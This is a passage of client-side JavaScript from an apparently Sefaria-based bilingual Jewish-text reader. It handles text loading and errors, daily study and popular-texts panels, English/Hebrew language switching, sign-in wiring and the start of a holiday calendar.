            // shows it is working (audit L-2) so the click doesn't look inert.
            const settleTrigger = markTriggerPending();
            let openedGrid = false;
            try {
                openedGrid = await maybeOpenReferenceGrid(normalizedRequestRef);
            } finally {
                settleTrigger();
            }
            if (openedGrid) {
                finishViewSwap();
                return 'opened';
            }
            // Another load started while this one asked.
            return myRequestId === _readTextRequestGen ? 'read' : 'stale';
        }

        function resetReaderChrome() {
            homeGrid.style.display = 'none';
            closeMobilePanels();
            closeChapterGrid();
            closeReaderSettingsPanel();
            setReaderSubtitle('');
            collapseCommentaryPanel();
            resetSelectionInsights();
        }

        // The skeleton (and fade) while a text loads, or nothing when the chapter
        // is already on the page (server-rendered): no skeleton, no fetch, no
        // fade; the rows are redrawn with this reader's own preferences, which
        // look the same by default.
        async function prepareReaderForText(ref, normalizedRequestRef, options, serverText) {
            leaveViewScroll();
            appState.shownView = null;
            if (serverText) {
                resetReaderChrome();
                return;
            }
            // A retry stays on the view it's retrying: no transition.
            await swapView(() => {
                homeGrid.style.display = 'none';
                showReaderSkeleton(normalizedRequestRef || String(ref || ''), { toolbar: true });
                closeMobilePanels();
                closeChapterGrid();
                closeReaderSettingsPanel();
                setReaderSubtitle('');
                collapseCommentaryPanel();
                resetSelectionInsights();
            }, { transition: options.loadRetryAttempt == null });
        }

        function friendlyTextError(data) {
            const errStr = String(data.error || '');
            const errType = data.error_type || '';
            if (errType === 'network') {
                return t(
                    "Couldn't connect to load this text. Check your connection.",
                    'לא ניתן היה להתחבר כדי לטעון את הטקסט. בדקו את החיבור.'
                );
            }
            if (errType === 'not_found') {
                return t('This text could not be found.', 'הטקסט לא נמצא.');
            }
            if (errType === 'sefaria_blocked' || errStr.includes('403') || errStr.toLowerCase().includes('blocked')) {
                return t(
                    '\u26a0\ufe0f Sefaria is temporarily unavailable (access blocked). Please try again later.',
                    '\u26a0\ufe0f ספריא אינה זמינה כרגע (חסימת גישה). אנא נסה שנית מאוחר יותר.'
                );
            }
            if (errType === 'cors_blocked') {
                return t(
                    '\u26a0\ufe0f Cannot connect to Sefaria from this browser (CORS policy). Try reloading the page.',
                    '\u26a0\ufe0f לא ניתן להתחבר לספריא מדפדפן זה. נסה לרענן את הדף.'
                );
            }
            return `${t('Could not load text:', 'לא ניתן לטעון את הטקסט:')} ${errStr}`;
        }

        function clearReaderAfterLoadFailure() {
            readerTopBar?.classList.add('hidden');
            syncReaderTopBarOffset();
            window.currentTextPayload = null;
            window.currentTextPayloadChain = [];
            resetInfiniteReaderState(null);
        }

        function showTextLoadError(data, ref, normalizedRequestRef, options) {
            const errType = data.error_type || '';
            document.getElementById('readerTitle').innerText = normalizedRequestRef || String(ref || '');
            // A missing text won't appear on a retry; everything else may.
            renderReaderLoadError(friendlyTextError(data), ref, options, { notFound: errType === 'not_found' });
            // Only where the address is this text's: a click that failed
            // leaves the last view's URL, which is still a real page.
            if (errType === 'not_found' && options.fromRoute) window.ShelahRouter?.markNotFound();
            clearReaderAfterLoadFailure();
            logReliability('text-load-error', { ref: normalizedRequestRef || String(ref || ''), error: String(data.error || ''), error_type: errType });
        }

        function textSidebarMarkup(data, requestedRef) {
            const categories = data.categories || [];
            const sidebarReference = isHebrewMode()
                ? localizeReferenceLabel(data.ref || requestedRef)
                : String(data.ref || requestedRef || '');
            const categoryPath = (isHebrewMode() ? categories.map(translateCategoryToken) : categories).join(' › ');
            return `
                <div class="text-xs space-y-2">
                    <div><span class="font-bold text-slate-700">${t('Reference:', 'הפניה:')}</span> <span class="text-slate-500">${escapeHtml(sidebarReference)}</span></div>
                    ${data.heTitle ? `<div><span class="font-bold text-slate-700">${t('Hebrew:', 'עברית:')}</span> <span class="font-hebrew text-slate-600">${data.heTitle}</span></div>` : ''}
                    ${categories.length ? `<div><span class="font-bold text-slate-700">${t('Category:', 'קטגוריה:')}</span> <span class="text-slate-500">${categoryPath}</span></div>` : ''}
                    ${data.era ? `<div><span class="font-bold text-slate-700">${t('Era:', 'תקופה:')}</span> <span class="text-slate-500">${data.era}</span></div>` : ''}
                </div>`;
        }

        function paintTextView(data, resolvedRef, ref, normalizedRequestRef, options, serverText) {
            const paintedRef = resolvedRef || normalizedRequestRef || String(ref || '');
            // The server-rendered page is always the default community's text.
            paintedText = { ref: paintedRef, payload: data, query: serverText ? '' : currentTextQuery(paintedRef) };
            window.ShelahTextVersions?.render?.(data);
            // A saved non-default community or edition pick: the server-rendered text is not
            // the one it asks for, and nothing else would fetch the right one.
            if (serverText && currentTextQuery(paintedRef)) queueMicrotask(() => window.ShelahReaderText.reloadIfChanged());
            // Title
            const titleEl = document.getElementById('readerTitle');
            const fallbackTitle = data.title || normalizedRequestRef || String(ref || '');
            titleEl.innerText = getChunkHeaderTitle({ ...data, title: fallbackTitle, ref: data.ref || normalizedRequestRef || String(ref || '') }) || fallbackTitle;
            // Stable snapshot of the title as first loaded — used to decide
            // whether the first chunk's own section-title bar would be a
            // redundant repeat of the page title (see renderCurrentTextByLayout).
            // readerTitle.innerText itself later drifts as the user scrolls
            // (updateReaderHeaderForVisibleChunk keeps it in sync with whatever
            // chunk is on screen), so re-reading the live DOM there instead of
            // this snapshot made that redundant-header decision flip on every
            // re-render depending on scroll position — the "inconsistent
            // titling" bug where a chunk's title box would appear/disappear
            // across renders for no reason tied to that chunk itself.
            window.currentTextAnchorTitle = titleEl.innerText;
            setCurrentView('text', data.ref || resolvedRef || normalizedRequestRef || ref, data.title || data.ref || resolvedRef || normalizedRequestRef || ref, options);
            if (options.fromRoute) canonicalizeTextRoute(data.ref || resolvedRef);
            window.currentTextPayload = data;
            window.currentTextPayloadChain = [data];
            resetInfiniteReaderState(data);
            // The week's parasha ends with its haftarah. When the week's parasha
            // is not known yet (a link opened straight into the reader), it is
            // fetched after the first paint.
            const weekly = freshWeeklyParasha();
            const haftarah = weeklyHaftarahFor(data, weekly);
            if (haftarah) followWithHaftarah(haftarah);
            else if (!weekly) void followWeeklyParashaWithHaftarah(data);
            commentaryPreloader?.reset();
            window.currentPrayerName = null;

            // Badge
            const categories = data.categories || [];
            document.querySelector('#reader header .bg-slate-100').textContent =
                (isHebrewMode() ? categories.map(translateCategoryToken).join(' › ') : categories.join(' › ')) || t("Sh'elah Library", "ספריית ש'אלה");

            // Continuous reading uses per-chunk section headers; avoid duplicating old single-subtitle logic.
            setReaderSubtitle('');

            applyReaderPreferences({ adoptRenderedText: Boolean(serverText) });

            // Update left sidebar with metadata
            sidebarContent.innerHTML = textSidebarMarkup(data, normalizedRequestRef || ref);

            // Back/Forward to this text: the verse it was left at (U-7).
            // A server-rendered page is already at its top, and a reader
            // who started scrolling before the app booted stays where they are.
            if (!restoreViewScroll(options.restoreScroll, 'text') && !serverText) scrollPrimaryToTop('smooth');

            // Adjacent (prev/next) refs are only needed for infinite-scroll
            // continuation, not for painting the current chunk — fetch them
            // after first paint instead of blocking on them, so the user
            // isn't staring at a blank reader pane during this extra round
            // trip. Guarded against the user having navigated to a different
            // text before this resolves.
            ensurePayloadAdjacentRefs(data).then(() => {
                if (window.currentTextPayload !== data) return;
                if (!infiniteReaderState.haftarah) infiniteReaderState.nextRef = String(data.next || '').trim();
                infiniteReaderState.prevRef = String(data.prev || '').trim();
            }).catch(() => {});
        }

        function showTextRuntimeError(err, ref, normalizedRequestRef, options) {
            hideReaderSkeleton({ loaded: false });
            reader.classList.remove('hidden');
            applySidebarVisibility();
            const fallbackMessage = t('Error loading text.', 'שגיאה בטעינת הטקסט.');
            const runtimeMessage = String(err?.message || '').trim();
            const displayMessage = runtimeMessage ? `${fallbackMessage} ${runtimeMessage}` : fallbackMessage;
            renderReaderLoadError(displayMessage, ref, options);
            clearReaderAfterLoadFailure();
            logReliability('text-load-runtime-error', { ref: normalizedRequestRef || String(ref || ''), message: runtimeMessage || 'unknown' });
        }

        async function readText(ref, options = {}) {
            // One verse ("Leviticus 26:33", an AI answer's source or a link)
            // opens its whole chapter, scrolled to the verse and marked. Back/
            // Forward (restoreScroll) puts the chapter back where it was left.
            const verse = options.wholeRef ? null : verseInChapter(ref);
            if (verse && options.restoreScroll) return readText(verse.chapterRef, { ...options, wholeRef: true });
            if (verse) return openVerse(ref, options);
            const myRequestId = ++_readTextRequestGen;
            const normalizedRequestRef = String(ref || '').replace(/\s+/g, ' ').trim();

            if (await openGridInsteadOfText(normalizedRequestRef, options, myRequestId) !== 'read') return;

            const serverText = options.fromRoute ? takeServerRenderedText(normalizedRequestRef) : null;
            await prepareReaderForText(ref, normalizedRequestRef, options, serverText);
            if (myRequestId !== _readTextRequestGen) return;

            try {
                const { payload: data, resolvedRef } = await fetchTextPayloadWithFallback(normalizedRequestRef || ref);

                // A newer readText() call started while this one was in flight — its
                // response already owns the reader pane; applying this stale one now
                // would silently overwrite it (or flash content the user never asked
                // for last) with no error.
                if (myRequestId !== _readTextRequestGen) return;

                hideReaderSkeleton({ loaded: !data.error && !serverText });
                reader.classList.remove('hidden');
                applySidebarVisibility();

                if (data.error) {
                    showTextLoadError(data, ref, normalizedRequestRef, options);
                    return;
                }
                paintTextView(data, resolvedRef, ref, normalizedRequestRef, options, serverText);
            } catch (err) {
                // A newer load owns the reader; this one's failure is moot.
                if (myRequestId !== _readTextRequestGen) return;
                showTextRuntimeError(err, ref, normalizedRequestRef, options);
            }
        }

        // ─── POPULAR TEXTS PANEL ─────────────────────────────────────────────
        async function loadParashaQuickLink(attempt = 0) {
            const quickLink = document.getElementById('parashaQuickLink');
            const homeQuickLink = document.getElementById('homeParashaQuickLink');
            const shabbatWeekLink = document.getElementById('shabbatWeekName');
            if (!quickLink && !homeQuickLink && !shabbatWeekLink) return;

            const applyParashaLink = (payload) => {
                if (!payload) return;

                const ref = payload.ref || 'Genesis 1';
                const enTitle = (payload.enTitle || 'Parashat HaShavua').trim();
                const heTitle = (payload.heTitle || '').trim();
                const titleEn = payload.titleEn || (heTitle ? `${enTitle} · ${heTitle}` : enTitle);
                const titleHe = payload.titleHe || heTitle || enTitle;
                let openTip;
                if (isHebrewMode()) openTip = `פתח ${heTitle || enTitle}`;
                else openTip = heTitle ? `Open ${enTitle} (${heTitle})` : `Open ${enTitle}`;

                const applyToElement = (linkEl) => {
                    if (!linkEl) return;
                    linkEl.dataset.en = titleEn;
                    linkEl.dataset.he = titleHe;
                    linkEl.textContent = isHebrewMode() ? titleHe : titleEn;
                    linkEl.title = openTip;
                    linkEl.dataset.onclickArg = ref;
                };

                applyToElement(quickLink);
                applyToElement(homeQuickLink);

                // "This Week's Shabbat" (Holiday Season widget) keeps its own
                // text -- zmanim.js's renderShabbatWeekName() already names it
                // from a different, already-loaded source, and overwriting it
                // here would race that render -- but it reuses this same
                // resolved ref so the value opens the parasha text, exactly
                // like the two quick links above.
                if (shabbatWeekLink) {
                    shabbatWeekLink.title = openTip;
                    shabbatWeekLink.dataset.onclickArg = ref;
                }
            };

            const cachedParasha = freshWeeklyParasha();
            if (cachedParasha) {
                applyParashaLink(cachedParasha);
                return;
            }

            // Unavailable: the default quick link stays, and the week's
            // parasha is fetched again later (no error UI for a link).
            const retryQuietly = () => window.ShelahLoadRegion?.retryLater(quickLink || homeQuickLink,
                (next) => { void loadParashaQuickLink(next); }, { attempt });
            try {
                applyParashaLink(await fetchWeeklyParasha());
            } catch {
                retryQuietly();
            }
        }

        function bindDailyStudyLinks() {
            document.querySelectorAll('.daily-study-link').forEach((btn) => {
                btn.addEventListener('click', async () => {
                    const ref = (btn.dataset.dailyRef || '').trim();
                    if (!ref) return;
                    await readText(ref);
                });
            });
        }

        function renderDailyStudyFallback(list) {
            list.innerHTML = `<p class="text-sm text-slate-500 italic" data-en="No active schedule fetched." data-he="לא נמצאה תוכנית לימוד יומית פעילה.">${escapeHtml(t('No active schedule fetched.', 'לא נמצאה תוכנית לימוד יומית פעילה.'))}</p>`;
        }

        // Fetches /api/daily-study client-side and fills in the skeleton left by
        // index.html's dailyStudyList (moved off the homepage's server render path —
        // see app.py's index() for why: it was a synchronous, unbounded-latency
        // Sefaria call blocking the whole page's TTFB).
        async function populateDailyStudy(attempt = 0) {
            const list = document.getElementById('dailyStudyList');
            if (!list) return;

            const dateEl = document.getElementById('hebrewDateDisplay');
            const ENTRIES = [
                { key: 'daf_yomi', labelEn: 'Daf Yomi', labelHe: 'דף יומי' },
                { key: 'mishnah_yomi', labelEn: 'Mishnah Yomi', labelHe: 'משנה יומית' },
                { key: 'rambam', labelEn: 'Daily Rambam', labelHe: 'רמב״ם יומי' },
            ];

            try {
                const r = await fetch('/api/daily-study', { credentials: 'same-origin' });
                if (!r.ok) throw new Error('daily-study unavailable');
                const daily = await r.json().catch(() => ({}));
                await afterStyles(() => {});

                if (dateEl && daily?.hebrew_date && !hebrewDateFromLocation) {
                    // Go through refreshHebrewDateDisplay() (not a direct
                    // textContent write) so the EN->HE cache it keeps on
                    // dataset.en gets the real date instead of staying
                    // pinned to the static "Today" placeholder it captured
                    // on first run -- otherwise the next language toggle
                    // reverts the display back to "Today".
                    dateEl.dataset.en = daily.hebrew_date;
                    delete dateEl.dataset.he;
                    refreshHebrewDateDisplay();
                    syncHebrewDateMobilePosition();
                }

                const rowsHtml = ENTRIES.map(({ key, labelEn, labelHe }) => {
                    const item = daily?.[key];
                    if (!item?.title) return '';
                    const ref = escapeHtml(item.ref || '');
                    const titleEn = escapeHtml(item.title || '');
                    const titleHe = escapeHtml(item.title_he || item.title || '');
                    const label = isHebrewMode() ? labelHe : labelEn;
                    const title = isHebrewMode() ? (item.title_he || item.title) : item.title;
                    return `
                        <div class="home-daily-entry">
                            <span class="home-daily-label" data-en="${escapeHtml(labelEn)}" data-he="${escapeHtml(labelHe)}">${escapeHtml(label)}</span>
                            <button type="button" data-daily-ref="${ref}" data-en="${titleEn}" data-he="${titleHe}"
                                class="daily-study-link home-daily-link">${escapeHtml(title)}</button>
                        </div>`;
                }).filter(Boolean).join('');

                if (!rowsHtml) {
                    renderDailyStudyFallback(list);
                } else {
                    list.innerHTML = rowsHtml;
                    bindDailyStudyLinks();
                }
            } catch {
                failListRegions([list],
                    t("Couldn't load today's study. Check your connection.", 'לא ניתן לטעון את הלימוד היומי. בדקו את החיבור.'),
                    populateDailyStudy, attempt);
            } finally {
                list.removeAttribute('aria-busy');
            }
        }

        async function populatePopularTexts(attempt = 0) {
            const grid = document.getElementById('popularTextsGrid');
            if (!grid) return;

            try {
                const hasFreshCache = textsCache.popularTexts
                    && (Date.now() - textsCache.popularTextsTs) < POPULAR_TEXTS_CACHE_TTL_MS;

                let data = textsCache.popularTexts;
                if (!hasFreshCache) {
                    const r = await fetch('/api/library/popular');
                    if (!r.ok) {
                        throw new Error('popular texts unavailable');
                    }
                    data = await r.json();
                    textsCache.popularTexts = data;
                    textsCache.popularTextsTs = Date.now();
                }

                await afterStyles(() => {});
                let html = '';
                const alignClass = isHebrewMode() ? 'text-end' : 'text-start';
                const colors = {
                    'Tanakh': '#004e5f', 'Mishnah': '#5a99b7',
                    'Talmud': '#a08a4a', 'Halakhah': '#802f3e'
                };
                Object.entries(data).forEach(([cat, texts]) => {
                    const color = colors[cat] || '#374151';
                    texts.forEach(t => {
                        const encodedRef = encodeURIComponent(String(t.ref || ''));
                        const hebrewHeading = String(t.he || getHebrewStaticLabel(t.title) || t.title || '').trim();
                        const title = isHebrewMode()
                            ? localizeLooseHebrewPhrase(getHebrewStaticLabel(t.title) || t.he || t.title)
                            : t.title;
                        const description = isHebrewMode()
                            ? localizeLooseHebrewPhrase(getHebrewStaticLabel(t.description) || t.description)
                            : t.description;
                        html += `
                        <button data-onclick="readText" data-onclick-arg="${encodedRef}" data-onclick-encoding="uri"
                            dir="${isHebrewMode() ? 'rtl' : 'ltr'}"
                            class="${alignClass} p-3 rounded-sm border border-[#ddd4c3] hover:border-[${color}] hover:shadow-xs transition group bg-[#fffaf1]">
                            <div class="font-hebrew text-lg text-slate-700 group-hover:text-[${color}]">${escapeHtml(hebrewHeading)}</div>
                            <div class="text-xs font-serif text-slate-800 mt-1">${escapeHtml(title)}</div>
                            <div class="text-xs text-slate-500 mt-0.5">${escapeHtml(description)}</div>
                        </button>`;
                    });
                });
                grid.innerHTML = html;
                grid.setAttribute('aria-busy', 'false');
                applyStaticHebrewFallbackTranslations();
            } catch {
                failListRegions([grid],
                    t("Couldn't load popular texts. Check your connection.", 'לא ניתן לטעון טקסטים פופולריים. בדקו את החיבור.'),
                    populatePopularTexts, attempt);
            }
        }

        // Load popular texts on page load
        document.addEventListener('DOMContentLoaded', () => {
            syncReaderTopBarOffset();
            hydratePreferences();
            void populateDailyStudy();
            void loadParashaQuickLink();
            // The worker's install fetches the offline shell (~0.5 MB): after the
            // page has settled, not alongside its own load.
            const registerSoon = () => window.setTimeout(() => { void registerServiceWorker(); }, 3000);
            if (document.readyState === 'complete') registerSoon();
            else window.addEventListener('load', registerSoon, { once: true });

            // Measure topbar height and expose as CSS variable for mobile drawer alignment
            function syncTopbarHeight() {
                const topbar = document.querySelector('.topbar');
                if (topbar) {
                    const h = topbar.getBoundingClientRect().height;
                    document.documentElement.style.setProperty('--topbar-height', h + 'px');
                }
                // Tab bar is display:none from 1024px up, so this reads 0 there.
                const tabs = document.getElementById('mobileBottomTabs');
                if (tabs) {
                    document.documentElement.style.setProperty(
                        '--mobile-tabs-height', tabs.getBoundingClientRect().height + 'px');
                }
            }
            syncTopbarHeight();
            window.addEventListener('resize', syncTopbarHeight);
            syncHebrewDateMobilePosition();
            window.addEventListener('resize', syncHebrewDateMobilePosition);
            // #topbarControls' width isn't stable after this handler returns --
            // e.g. Clerk swaps the "Sign In" button for a user-profile widget
            // once auth state resolves, well after this initial load. A plain
            // resize listener misses that (window width hasn't changed), so
            // watch the two elements the gap is measured between directly.
            const hebrewDateBrandEl = document.getElementById('brandHomeBtn');
            const hebrewDateControlsEl = document.getElementById('topbarControls');
            if (window.ResizeObserver && hebrewDateBrandEl && hebrewDateControlsEl) {
                const hebrewDateResizeObserver = new ResizeObserver(() => syncHebrewDateMobilePosition());
                hebrewDateResizeObserver.observe(hebrewDateBrandEl);
                hebrewDateResizeObserver.observe(hebrewDateControlsEl);
            }

            queueBackgroundTask(() => {
                renderSiddurMenus();
            }, 1200);
            // The library tree sits in a closed <details>, and its index is
            // ~360 KB: fetch it when that opens or is reached for (and with the
            // Texts menu, openTextsMenu), not with every page load.
            const libraryDetails = libraryIndexSidebar?.closest('details');
            if (!libraryDetails || libraryDetails.open) {
                queueBackgroundTask(() => {
                    void loadLibraryIndexViews();
                }, 1600);
            } else {
                const loadLibrary = () => { void loadLibraryIndexViews(); };
                libraryDetails.addEventListener('toggle', () => {
                    if (libraryDetails.open) loadLibrary();
                });
                const librarySummary = libraryDetails.querySelector(':scope > summary');
                ['pointerenter', 'focus', 'touchstart'].forEach((type) => {
                    librarySummary?.addEventListener(type, loadLibrary, { once: true, passive: true });
                });
            }
            queueBackgroundTask(() => {
                void populatePopularTexts();
            }, 1800);
            // (The devtools heartbeat is fetched when the inspector opens.)
        });

        // Multi-language Toggle with data attributes
        // Handle lang + RTL for Hebrew. The search icon and the input's
        // room for it follow dir in style.css, so a Hebrew load has them
        // on the left from the head script's first paint.
        function setHtmlLanguage(lang) {
            const html = document.documentElement;
            if (lang === 'he') {
                html.setAttribute('lang', 'he');
                html.setAttribute('dir', 'rtl');
                html.classList.add('rtl');
            } else {
                html.setAttribute('lang', 'en');
                html.setAttribute('dir', 'ltr');
                html.classList.remove('rtl');
            }
        }

        function markActiveLanguageButton(lang) {
            document.querySelectorAll('.lang-btn').forEach(btn => {
                btn.classList.remove('lang-btn-active');
                if (btn.dataset.lang === lang) {
                    btn.classList.add('lang-btn-active');
                }
            });
        }

        function localizePlaceholders(lang) {
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.placeholder = lang === 'he' ? searchInput.dataset.hePlaceholder : searchInput.dataset.enPlaceholder;
                // The accessible name follows the visible prompt, minus its trailing dots.
                searchInput.setAttribute('aria-label', searchInput.placeholder.replace(/[.…]+$/, ''));
            }

            if (libraryIndexFilterInput) {
                libraryIndexFilterInput.placeholder = lang === 'he'
                    ? (libraryIndexFilterInput.dataset.hePlaceholder || 'סנן נושאים או טקסטים...')
                    : (libraryIndexFilterInput.dataset.enPlaceholder || 'Filter topics or texts...');
            }
            const citySearchInput = document.getElementById('citySearchInput');
            if (citySearchInput) {
                citySearchInput.placeholder = lang === 'he'
                    ? (citySearchInput.dataset.hePlaceholder || 'לדוגמה: ירושלים, ניו יורק')
                    : (citySearchInput.dataset.enPlaceholder || 'e.g. Jerusalem, New York...');
                citySearchInput.dir = lang === 'he' ? 'rtl' : 'ltr';
            }
        }

        function localizeAccountLabels(lang) {
            if (signInBtn) signInBtn.textContent = lang === 'he' ? 'התחברות' : 'Sign In';
            if (userProfileSignOutAction) userProfileSignOutAction.textContent = lang === 'he' ? 'התנתקות' : 'Sign Out';
            if (userProfileMenuLabel?.textContent === 'Signed in') {
                userProfileMenuLabel.textContent = lang === 'he' ? 'מחובר' : 'Signed in';
            }
        }

        function localizeReaderButtonLabels(lang) {
            const hebrew = lang === 'he';
            const labelled = [
                [readerSettingsBtn, 'הגדרות קריאה', 'Reader Settings'],
                [readerPrevTopBarBtn, 'קטע קודם', 'Previous Section'],
                [readerNextTopBarBtn, 'קטע הבא', 'Next Section'],
                [readerCommentaryTopBarBtn, 'מפרשים', 'Commentary'],
                [document.getElementById('citySearchBtn'), 'חפש לפי עיר', 'Search by city'],
            ];
            for (const [button, he, en] of labelled) {
                if (button) setControlLabel(button, hebrew ? he : en);
            }
            if (readerSettingsBtn && readerSettingsBtnLabel) {
                readerSettingsBtnLabel.textContent = hebrew ? 'הגדרות קריאה' : 'Reader Settings';
            }
        }

        function refreshCalendarLanguage() {
            const calendarModalEl = document.getElementById('calendarModal');
            // toggleLanguage also runs during startup, before the calendar's
            // `let` below is initialized: touch it only once it was built.
            if (calendarModalEl?.dataset.calendarBuilt === '1') syncCalendarLanguage();
            if (calendarModalEl?.open && holidaysCalendar) {
                holidaysCalendar.refetchEvents();
                if (calendarSelectedKey) renderCalendarAgenda();
            }
        }

        // Re-render dynamic widgets so their generated labels follow the selected language.
        function refreshLanguageWidgets(lang) {
            if (appState.currentView?.type === 'text') {
                updateReaderHeaderForVisibleChunk(infiniteReaderState.currentVisibleChunkIndex || 0);
            }

            refreshHebrewDateDisplay(lang);
            syncHebrewDateMobilePosition();

            renderPersonalShelf();
            updateBookmarkButton();
            applySidebarVisibility();
            refreshCalendarLanguage();
            if (appState.suggestionItems.length) {
                renderSearchSuggestions();
            }

            // static/js/zmanim.js owns zmanimData and the full render; this used
            // to duplicate ~80 lines of fetchZmanimAPI's own render logic here. refreshZmanimDisplay()
            // itself no-ops when the module hasn't fetched anything yet, so
            // no local zmanimData guard is needed -- just skip the call
            // entirely if the module bridge isn't up yet (e.g. this runs
            // once automatically before main.js's deferred module has had a
            // chance to bootstrap).
            if (window.ShelahModules?.refreshZmanimDisplay) {
                window.ShelahModules.refreshZmanimDisplay(buildZmanimDeps());
            }
        }

        function refreshSiddurForLanguage() {
            renderSiddurMenus();
            const siddurPage = appState.currentView?.type === 'siddur' ? window.ShelahSiddur?.rerender() : null;
            if (siddurPage) {
                appState.currentView.label = siddurPage.label;
                document.getElementById('readerTitle').innerText = siddurPage.label;
                syncDocumentTitle();
            }
        }

        function refreshSelectionInsightsForLanguage() {
            if (!selectionCommentaryState.groupedCommentaries.length) return;
            if (selectionCommentaryState.wordInfo?.word) {
                void refreshSelectionWordMeaning();
            } else if (selectionCommentaryState.activeCommentaryRef) {
                void openCommentaryInline(selectionCommentaryState.activeCommentaryRef);
            } else {
                renderSelectionInsightsChooser();
            }
        }

        // Update reader content if showing prayer or community
        function refreshReaderContentForLanguage(lang) {
            if (!reader || reader.classList.contains('hidden')) return;
            if (window.currentPrayerContent) {
                const currentPrayerName = appState.currentView?.type === 'prayer'
                    ? appState.currentView.value
                    : (window.currentPrayerName || '');
                document.getElementById('readerContent').innerHTML = renderPrayerContent(window.currentPrayerContent, currentPrayerName);
                renderPrayerDisplayByLayout(lang);
            } else if (window.currentCommunityData) {
                document.getElementById('readerContent').innerHTML = renderCommunityContent(window.currentCommunityData);
            }
        }

        function toggleLanguage(lang, options = {}) {
            // Normalizing, persisting, and swapping [data-en]/[data-he] text
            // lives in static/js/topbar_shared.js, shared with
            // components/legal_scripts.html's own toggleLanguage. Everything
            // below is index.html-specific (search icon RTL swap, modal
            // titles, and the rest of this app's own DOM).
            // A link's language is shown, never saved (the visitor's own
            // choice stays theirs for their next visit).
            lang = applyLanguagePreference(lang, { ...options, persist: !options.fromRoute }, LANGUAGE_MANUAL_KEY);
            displayedLanguage = lang;
            languageFromRoute = Boolean(options.fromRoute);
            delete document.documentElement.dataset.langPending;
            if (!options.auto && !options.fromRoute) {
                // A manual switch is saved, so a link's ?lang= has nothing
                // left to override: it leaves the address bar (U-8).
                releaseRouteDisplayPref('lang');
            }

            setHtmlLanguage(lang);
            markActiveLanguageButton(lang);
            localizePlaceholders(lang);
            localizeAccountLabels(lang);
            localizeReaderButtonLabels(lang);
            refreshLanguageWidgets(lang);

            // Keep pane visibility/layout controlled by reader preferences.
            applyReaderPreferences();

            // Update page title to match language
            syncDocumentTitle();

            updateThemeToggleUi(lang);

            applyStaticHebrewFallbackTranslations(lang);

            refreshSiddurForLanguage();
            if (Array.isArray(textsCache.communitiesList)) {
                populateCommunitiesListHTML(textsCache.communitiesList);
            }
            renderLibraryIndexViews({ modal: textsMenuIsOpen() });
            void populatePopularTexts();

            refreshSelectionInsightsForLanguage();
            refreshReaderContentForLanguage(lang);
        }

        // Load saved language preference on page load
        const storedLang = localStorage.getItem('preferredLanguage');
        const languageManuallySet = localStorage.getItem(LANGUAGE_MANUAL_KEY) === '1';
        const shouldForceRegionalHebrew = regionalDefaults.language === 'he' && !languageManuallySet;
        const rawSavedLang = shouldForceRegionalHebrew
            ? 'he'
            : (storedLang || regionalDefaults.language || 'en');

        try {
            const bootPrefs = JSON.parse(localStorage.getItem(APP_PREFS_KEY) || '{}');
            appState.prefs.theme = normalizeThemePreference(bootPrefs.theme || appState.prefs.theme);
        } catch {
            appState.prefs.theme = normalizeThemePreference(appState.prefs.theme);
        }
        setThemePreference(appState.prefs.theme, { persist: false });

        localStorage.setItem('preferredLanguage', rawSavedLang);
        const savedLang = (rawSavedLang === 'he' || rawSavedLang === 'en') ? rawSavedLang : 'en';
        // A link's ?lang= is this load's language (the head script painted
        // it already); hydrateRoute's display keys would only switch to it
        // after a first render in the saved one.
        // (The router module isn't loaded yet; ?lang= is a plain query key.)
        const linkLang = new URLSearchParams(window.location.search).get('lang');
        if (linkLang === 'he' || linkLang === 'en') toggleLanguage(linkLang, { auto: true, fromRoute: true });
        else toggleLanguage(savedLang, { auto: true });

        if (signInBtn) {
            // A real link (/signin works in a new tab or without scripts); a plain
            // click opens the window in place instead.
            signInBtn.addEventListener('click', (event) => {
                if (isModifiedClick(event)) return;
                event.preventDefault();
                void handleSignIn();
            });
        }

        if (userProfileSignOutAction) {
            userProfileSignOutAction.addEventListener('click', () => {
                closeUserProfileMenu();
                void handleSignOut();
            });
        }

        if (userProfileLink) {
            userProfileLink.addEventListener('click', async (e) => {
                e.preventDefault();
                await openClerkUserProfile('profile');
            });
        }

        const userProfilePrivacyDataAction = document.getElementById('userProfilePrivacyDataAction');
        if (userProfilePrivacyDataAction) {
            userProfilePrivacyDataAction.addEventListener('click', () => {
                openPrivacyDataModal();
            });
        }

        // initClerkAuth() needs window.Clerk, set by the deferred SDK script
        // tag above -- deferred scripts run right before DOMContentLoaded,
        // after all parsing that precedes them. This inline script executes
        // immediately as the parser reaches it, which on a page this size is
        // well before that point, so a bare call here loses the race almost
        // every time (window.Clerk still undefined) and initClerkAuth() has
        // no retry -- it just logs a warning and leaves the account button
        // permanently hidden. Deferring the call to DOMContentLoaded
        // guarantees the SDK script has already run by the time it fires.
        document.addEventListener('DOMContentLoaded', () => {
            if (!isClerkConfigured() || clerkNeededAtLoad()) {
                void ensureClerk();
                return;
            }
            // Nobody can be signed in without Clerk's cookie: show the Sign in
            // button now, and fetch Clerk when someone reaches for the account.
            void refreshAuthUi();
            const warmClerk = () => { void ensureClerk(); };
            ['pointerenter', 'focusin', 'touchstart'].forEach((type) => {
                authControls?.addEventListener(type, warmClerk, { once: true, passive: true });
            });
        });

        let holidaysCalendar = null;
        let _calendarDidMount = false; // crossfade: skip animation on initial render
        let calendarSelectedKey = null; // 'YYYY-MM-DD' of the day shown in the agenda
        let calendarDayKinds = new Map(); // 'YYYY-MM-DD' -> 'holiday' | 'shabbat'

        // One request per year for the page's lifetime. The first open used to
        // wait on this fetch (grid drawn, then events popping in a beat later);
        // prefetching it on idle / on intent means the grid renders with its
        // events already in hand, and paging months is a cache hit.
        const calendarHolidayCache = new Map(); // year -> Promise<event[]>
        // The server prefixes titles with an emoji marker (🕍 Parashat …, 🌙 Rosh
        // Chodesh …). The UI draws those as Phosphor icons instead: strip the
        // emoji from the title and remember which icon it stood for.
        const CAL_EMOJI_ICONS = [
            ['🌅', 'sun-horizon'], ['🌇', 'sun-horizon'], ['🌃', 'moon-stars'],
            ['🕍', 'synagogue'], ['🌙', 'moon'], ['🕎', 'flame'], ['🕯', 'flame'],
            ['🔥', 'fire'], ['🇮🇱', 'flag'], ['⛰', 'mountains'], ['🌸', 'flower'],
            ['🌿', 'leaf'], ['🍋', 'leaf'], ['⏳', 'hourglass'],
        ];
        const CAL_ICON_PATHS = {
            'sun-horizon': PHOSPHOR_PATHS['sun-horizon'],
            'moon-stars': PHOSPHOR_PATHS['moon-stars'],
            'synagogue': PHOSPHOR_PATHS['synagogue'],
            'moon': PHOSPHOR_PATHS['moon'],
